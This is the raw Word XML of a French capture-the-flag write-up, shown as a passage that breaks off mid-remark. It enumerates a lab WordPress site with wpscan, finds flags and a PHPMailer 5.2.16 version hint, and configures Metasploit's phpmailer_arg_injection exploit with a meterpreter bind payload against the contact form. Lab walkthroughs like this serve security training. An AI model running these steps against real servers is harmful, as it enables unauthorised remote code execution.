    <w:p w14:paraId="39D00BA8" w14:textId="541D4509" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009C5F9B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001B0676">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>--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http://&lt;IP&gt;/wordpress/ --enumerate </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>u,vp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>,vt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1E8CD138" w14:textId="147293EA" w:rsidR="007709C2" w:rsidRDefault="00653894" w:rsidP="009D6503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A13F0B" wp14:editId="41E5911A">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2962276</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>5654675</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3731260" cy="266700"/>
                <wp:effectExtent l="19050" t="19050" r="21590" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="56958802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1260" cy="2667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66BCED" id="Rectangle 2" o:spid="_x0000_s1026" style="position:absolute;margin-left:233.25pt;margin-top:445.25pt;width:293.8pt;height:2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" filled="f" strokecolor="#e00" strokeweight="3pt"/>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="007709C2">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="727FBAFF" wp14:editId="504A08EF">
            <wp:extent cx="6645910" cy="7198995"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1905"/>
            <wp:docPr id="1570064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4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9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884C" w14:textId="246B7AEB" w:rsidR="004D075B" w:rsidRDefault="00A00C32" w:rsidP="009D650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F66C91" wp14:editId="064BC905">
            <wp:extent cx="6638925" cy="5629275"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="9839156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62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C0C29" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pP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BannerGrab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WordPress 4.8.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4B8E49" w14:textId="6595D8C5" w:rsidR="009D6503" w:rsidRPr="008D52B9" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Users :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> steven et </w:t>
      </w:r>
      <w:r w:rsidR="007709C2" w:rsidRPr="008D52B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Michael</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCB4F51" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRPr="008D52B9" w:rsidRDefault="004A04A1" w:rsidP="009D6503">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61BEB6E8" w14:textId="182B2216" w:rsidR="007709C2" w:rsidRDefault="007709C2" w:rsidP="009D6503">
      <w:r w:rsidRPr="007709C2">
        <w:t>La</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> visite de </w:t>
      </w:r>
      <w:r w:rsidRPr="007709C2">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007709C2">
        <w:t>wordpress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007709C2">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007709C2">
        <w:t>wp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007709C2">
        <w:t>-content/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007709C2">
        <w:t>uploads</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007709C2">
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> nous donne par la suite le flag 3 :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BF743B" w14:textId="1302C585" w:rsidR="007709C2" w:rsidRDefault="007709C2" w:rsidP="009D6503">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C6041B3" wp14:editId="330E9CC8">
            <wp:extent cx="6645910" cy="2147570"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="15124846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84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0E5A" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRPr="007709C2" w:rsidRDefault="004A04A1" w:rsidP="009D6503"/>
    <w:p w14:paraId="209E5712" w14:textId="77777777" w:rsidR="009D6503" w:rsidRPr="004A04A1" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r w:rsidRPr="004A04A1">
        <w:lastRenderedPageBreak/>
        <w:t>Visite de /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t>vendor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757F0B21" w14:textId="45439E89" w:rsidR="009D6503" w:rsidRDefault="004C2A12" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t>vendor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t>/PATH</w:t>
      </w:r>
      <w:r>
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="001162EE">
        <w:t>nous donne le</w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001162EE">
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t>Web root</w:t>
      </w:r>
      <w:r w:rsidR="001162EE">
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t xml:space="preserve"> : </w:t>
      </w:r>
      <w:r w:rsidR="001162EE">
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00D642E8">
        <w:t>/var/www/html</w:t>
      </w:r>
      <w:r w:rsidR="001162EE">
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="00C2103E">
        <w:t>, ainsi que le flag 1 :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35852289" w14:textId="07127D80" w:rsidR="00C2103E" w:rsidRDefault="00C2103E" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B6546A1" wp14:editId="275371FF">
            <wp:extent cx="4838700" cy="1143000"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="208730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0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836D" w14:textId="0CF2C5EB" w:rsidR="00A00C32" w:rsidRDefault="00A00C32">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25DAD6AB" w14:textId="47A46A0F" w:rsidR="009D6503" w:rsidRDefault="004C2A12" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t>/vendor/SECURITY.md</w:t>
      </w:r>
      <w:r>
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t xml:space="preserve"> : Indice </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t>PHPMailer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t xml:space="preserve"> &lt; 5.2.18 Vulnérable (CVE-2016-10033)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0500E58F" w14:textId="345A2465" w:rsidR="004D075B" w:rsidRPr="00993515" w:rsidRDefault="00A00C32" w:rsidP="0097283A">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A00C32">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0133090B" wp14:editId="64179297">
            <wp:extent cx="5572903" cy="1600423"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="96953684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3684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2454" w14:textId="45EAE171" w:rsidR="009D6503" w:rsidRDefault="004C2A12" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t>vendor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t>/VERSION</w:t>
      </w:r>
      <w:r>
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t xml:space="preserve"> : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t>BannerGrab</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009D6503" w:rsidRPr="00993515">
        <w:t xml:space="preserve"> : 5.2.16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012D1B5D" w14:textId="0FBD28F9" w:rsidR="004D075B" w:rsidRDefault="00A00C32" w:rsidP="00A00C32">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A00C32">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="66D9906D" wp14:editId="1DC4AFF8">
            <wp:extent cx="5401429" cy="1038370"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="211930114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0114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B94E" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRPr="00993515" w:rsidRDefault="004A04A1" w:rsidP="00A00C32">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E008BED" w14:textId="77777777" w:rsidR="009D6503" w:rsidRPr="004C2A12" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r w:rsidRPr="004C2A12">
        <w:t>Visite du site :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1604BBAC" w14:textId="0A4F2FF6" w:rsidR="009D6503" w:rsidRPr="00591017" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r w:rsidRPr="00591017">
        <w:t>Clique</w:t>
      </w:r>
      <w:r w:rsidR="00A00C32">
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00591017">
        <w:t xml:space="preserve"> sur “Contact” :</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> formulaire d’envoi de mail localiser en</w:t>
      </w:r>
      <w:r w:rsidRPr="00591017">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidRPr="00591017">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00591017">
        <w:t>contact.p</w:t>
      </w:r>
      <w:r>
        <w:t>hp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> »</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE6CC16" w14:textId="571A3494" w:rsidR="009D6503" w:rsidRDefault="00A07106" w:rsidP="009D6503">
      <w:r w:rsidRPr="00A07106">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="235FEC82" wp14:editId="401EFC3C">
            <wp:extent cx="6645910" cy="2376170"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="1229393677" name="Image 1" descr="Une image contenant texte, logiciel, Logiciel multimédia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3677" name="Image 1" descr="Une image contenant texte, logiciel, Logiciel multimédia, Icône d’ordinateur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B9A3" w14:textId="77777777" w:rsidR="004C2A12" w:rsidRDefault="004C2A12">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BB38DDB" w14:textId="30E738CD" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Démarrer la console </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3255F243" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="263BB6CE" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:t>Rechercher un exploit pour la vulnérabilité :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE0B4BB" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">6 &gt;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phpmailer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5682571A" w14:textId="4B8E9ED0" w:rsidR="009D6503" w:rsidRDefault="00A07106" w:rsidP="009D6503">
      <w:r w:rsidRPr="00A07106">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="396F8089" wp14:editId="16F91D24">
            <wp:extent cx="6645910" cy="1213485"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5715"/>
            <wp:docPr id="1300115732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15732" name="Image 1" descr="Une image contenant texte, capture d’écran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733C" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:t>Charger l’exploit avec son numéro d’index :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD5A91F" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>6 &gt; use 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EF0A06" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="009D6503"/>
    <w:p w14:paraId="42C612C8" w14:textId="0E39FCB0" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> le « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> » par </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>défault</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004D075B">
        <w:t xml:space="preserve"> est en « reverse » et non en </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t>« </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004D075B">
        <w:t>bind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004C2A12">
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="004D075B">
        <w:t xml:space="preserve"> et ne peu</w:t>
      </w:r>
      <w:r w:rsidR="00A07106">
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="004D075B">
        <w:t xml:space="preserve"> pas remonter dans le VPN, il faudra donc le changer (voir ci-dessous).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139D7FE6" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="009D6503"/>
    <w:p w14:paraId="43CB5AB2" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:t>Consulter les options nécessaires :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6348E9" w14:textId="77777777" w:rsidR="009D6503" w:rsidRPr="005312DC" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005312DC">
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005312DC">
        <w:t>6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005312DC">
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005312DC">
        <w:t>) &gt; options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF10236" w14:textId="77777777" w:rsidR="009D6503" w:rsidRPr="005312DC" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r w:rsidRPr="005312DC">
        <w:t>Configurer la ci</w:t>
      </w:r>
      <w:r>
        <w:t>ble (« </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rhosts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> »), l’URI où injecter les arguments PHP (« </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>targeturi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> », repérée en visitant le site) et la racine du site dans l’</w:t>
      </w:r>
      <w:r w:rsidRPr="005312DC">
        <w:t>arborescence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> du serveur (« </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>web_root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » repérée en visitant « /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vendor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/PATH ») :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEEBD49" w14:textId="77777777" w:rsidR="009D6503" w:rsidRPr="005312DC" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>msf6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) &gt; set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rhosts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;IP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cible</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005312DC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E09A65" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>msf6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) &gt; set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>targeturi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3A8FFEB7" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>msf6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) &gt; set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>triggeruri</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412B8D25" w14:textId="77777777" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>msf6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00993515">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) &gt; set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>web_root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /var/www/html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFF9568" w14:textId="50C26D6D" w:rsidR="004D075B" w:rsidRDefault="004D075B" w:rsidP="004D075B">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004D075B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>msf6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004D075B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004D075B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) &gt; set payload </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004D075B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hp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meterpreter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bin_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7FFA25C3" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004D075B">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32179250" w14:textId="77777777" w:rsidR="00C93149" w:rsidRPr="00C42680" w:rsidRDefault="00C93149" w:rsidP="00C93149">
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
